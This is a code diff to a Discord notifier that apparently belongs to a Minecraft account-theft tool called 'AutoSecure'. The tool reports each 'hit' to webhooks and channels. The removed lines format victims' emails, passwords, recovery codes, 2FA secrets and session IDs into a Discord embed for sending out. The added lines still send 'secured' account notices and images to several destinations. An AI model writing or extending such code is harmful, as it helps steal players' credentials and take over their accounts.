@@ -36,11 +36,16 @@ async function sendSecureNotification(client, accountData, targetChannelId = nul
         let customWebhook = null;
         let botToken = null;
 
+        let notificationChannelId = null;
+
         if (client?.username) {
             try {
-                const dbResults = await queryParams('SELECT hits_channel, webhook, token FROM autosecure WHERE user_id = ? AND botnumber = ? LIMIT 1', [client.username, client.botnumber || 1]);
+                const dbResults = await queryParams('SELECT hits_channel, notification_channel, webhook, token FROM autosecure WHERE user_id = ? AND botnumber = ? LIMIT 1', [client.username, client.botnumber || 1]);
                 if (dbResults && dbResults[0]?.hits_channel) {
                     channelId = dbResults[0].hits_channel.split('|')[0];
+                }
+                if (dbResults && dbResults[0]?.notification_channel) {
+                    notificationChannelId = dbResults[0].notification_channel.split('|')[0];
                 }
                 if (dbResults && dbResults[0]?.webhook) {
                     customWebhook = dbResults[0].webhook;
@@ -93,74 +98,30 @@ async function sendSecureNotification(client, accountData, targetChannelId = nul
             startFolderMonitor(tempDir, 5);
         }
 
-        const outputPath = path.join(tempDir, filename);
-        const imageBuffer = await makeCard(stats, outputPath);
-        const attachment = new AttachmentBuilder(imageBuffer, { name: filename });
+        let imageBuffer = null;
+        let attachment = null;
+        const isChildBot = client && client.botnumber && client.botnumber > 1;
+
+        if (!isChildBot) {
+            const outputPath = path.join(tempDir, filename);
+            imageBuffer = await makeCard(stats, outputPath);
+            attachment = new AttachmentBuilder(imageBuffer, { name: filename });
+        } else {
+            console.log(`[NOTIFIER] Skipping draw hit for child bot (botnumber: ${client.botnumber})`);
+        }
 
         // 1. Send via Webhooks if configured
         if (webhookUrls.size > 0) {
-            // Build rich Discord hit embed
-            const donutInfo = stats.donut || {};
-            const embedFields = [
-                { name: "👤 Minecraft Username", value: `\`${stats.username}\``, inline: true },
-                { name: "📧 Email", value: `\`${accountData.email || accountData.oldEmail || 'N/A'}\``, inline: true },
-                { name: "🔑 Password", value: `\`${accountData.password || 'N/A'}\``, inline: true },
-                { name: "🛡️ Recovery Code", value: `\`${accountData.recoveryCode || 'N/A'}\``, inline: true },
-                { name: "🔐 2FA Secret", value: `\`${accountData.secretkey || 'Disabled'}\``, inline: true },
-                { name: "📨 Security Email", value: `\`${accountData.secEmail || 'None'}\``, inline: true },
-            ];
-
-            if (stats.donutRank && stats.donutRank !== 'None') {
-                embedFields.push({ name: "🍩 Donut Rank", value: `**${stats.donutRank}**`, inline: true });
-            }
-            if (stats.donutMoney && stats.donutMoney !== '$0') {
-                embedFields.push({ name: "💰 Donut Money", value: `\`${stats.donutMoney}\``, inline: true });
-            }
-            if (stats.donutShards && stats.donutShards !== '0') {
-                embedFields.push({ name: "💎 Donut Shards", value: `\`${stats.donutShards}\``, inline: true });
-            }
-            if (stats.donutPlaytime && stats.donutPlaytime !== '0m') {
-                embedFields.push({ name: "⏳ Donut Playtime", value: `\`${stats.donutPlaytime}\``, inline: true });
-            }
-            if (stats.donutKDR && stats.donutKDR !== '0.00') {
-                embedFields.push({ name: "⚔️ Donut K/D", value: `\`${stats.donutKDR}\``, inline: true });
-            }
-            if (stats.networth && stats.networth !== '0') {
-                embedFields.push({ name: "🏰 Hypixel Networth", value: `\`${stats.networth}\``, inline: true });
-            }
-            if (stats.bedwars && stats.bedwars !== '0') {
-                embedFields.push({ name: "🛏️ Bedwars Star", value: `\`⭐ ${stats.bedwars}\``, inline: true });
-            }
-            if (accountData.ssid) {
-                embedFields.push({ name: "🎫 Minecraft SSID", value: `\`\`\`${accountData.ssid.substring(0, 100)}...\`\`\``, inline: false });
-            }
-
-            const hitEmbed = {
-                title: `🍩 NEW DONUT SMP HIT: ${stats.username}`,
-                description: `> Tài khoản **${stats.username}** đã được bảo mật thành công qua DonutSMP Storefront!`,
-                color: 0x38bdf8,
-                thumbnail: {
-                    url: `https://visage.surgeplay.com/bust/${encodeURIComponent(stats.username)}.png?y=-40&quality=lossless`
-                },
-                image: {
-                    url: `attachment://${filename}`
-                },
-                fields: embedFields,
-                footer: {
-                    text: `DonutSMP AutoSecure System • ${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}`,
-                    icon_url: 'https://website.donutsmp.org/bcGCsev.png'
-                },
-                timestamp: new Date().toISOString()
-            };
 
             for (const whUrl of webhookUrls) {
                 try {
                     const webhook = new WebhookClient({ url: whUrl });
-                    await webhook.send({
-                        embeds: [hitEmbed],
-                        files: [attachment]
-                    });
-                    console.log(`[NOTIFIER] Successfully sent hit image & embed to webhook (${whUrl.substring(0, 45)}...) for ${stats.username}`);
+                    const payload = {};
+                    if (attachment) payload.files = [attachment];
+                    else payload.content = `[Hit] **${stats.username}** secured! (Image disabled for child bot)`;
+                    
+                    await webhook.send(payload);
+                    console.log(`[NOTIFIER] Successfully sent hit image to webhook (${whUrl.substring(0, 45)}...) for ${stats.username}`);
                 } catch (whErr) {
                     console.error('[NOTIFIER] Error sending hit to webhook:', whErr.message);
                 }
@@ -168,7 +129,11 @@ async function sendSecureNotification(client, accountData, targetChannelId = nul
         }
 
         // 2. Send to Discord Channel strictly using the MAIN BOT client
-        if (channelId) {
+        const channelsToSend = [];
+        if (channelId) channelsToSend.push(channelId);
+        if (notificationChannelId && notificationChannelId !== channelId) channelsToSend.push(notificationChannelId);
+
+        for (const cid of channelsToSend) {
             try {
                 const mainBotClient = getMainBotClient();
                 let channel = null;
@@ -181,7 +146,7 @@ async function sendSecureNotification(client, accountData, targetChannelId = nul
                 ].filter(c => c && c.isReady && c.isReady() && c.channels);
 
                 for (const c of clients) {
-                    channel = await c.channels.fetch(channelId).catch(() => null);
+                    channel = await c.channels.fetch(cid).catch(() => null);
                     if (channel) {
                         senderTag = c.user?.tag || 'Bot';
                         break;
@@ -189,22 +154,28 @@ async function sendSecureNotification(client, accountData, targetChannelId = nul
                 }
 
                 if (channel) {
-                    await channel.send({
-                        files: [attachment]
-                    });
-                    console.log(`[NOTIFIER] Successfully sent hit image via ${senderTag} to channel <#${channelId}> for ${stats.username}`);
+                    const payload = {};
+                    if (attachment) payload.files = [attachment];
+                    else payload.content = `[Hit] **${stats.username}** secured! (Image disabled for child bot)`;
+
+                    await channel.send(payload);
+                    console.log(`[NOTIFIER] Successfully sent hit image via ${senderTag} to channel <#${cid}> for ${stats.username}`);
                 } else if (botToken || (config.tokens && config.tokens[0])) {
                     const { REST, Routes } = require('discord.js');
                     const rest = new REST({ version: '10' }).setToken(botToken || config.tokens[0]);
-                    await rest.post(Routes.channelMessages(channelId), {
-                        files: [{ name: filename, data: imageBuffer }]
-                    });
-                    console.log(`[NOTIFIER] Successfully sent hit image via REST API to channel <#${channelId}> for ${stats.username}`);
+                    const payload = {};
+                    if (imageBuffer) {
+                        payload.files = [{ name: filename, data: imageBuffer }];
+                    } else {
+                        payload.content = `[Hit] **${stats.username}** secured! (Image disabled for child bot)`;
+                    }
+                    await rest.post(Routes.channelMessages(cid), payload);
+                    console.log(`[NOTIFIER] Successfully sent hit image via REST API to channel <#${cid}> for ${stats.username}`);
                 } else {
-                    console.error(`[NOTIFIER] Channel <#${channelId}> not found on any bot client`);
+                    console.error(`[NOTIFIER] Channel <#${cid}> not found on any bot client`);
                 }
             } catch (chErr) {
-                console.error(`[NOTIFIER] Error sending hit image to channel ${channelId}:`, chErr.message);
+                console.error(`[NOTIFIER] Error sending hit image to channel ${cid}:`, chErr.message);
             }
         }
 
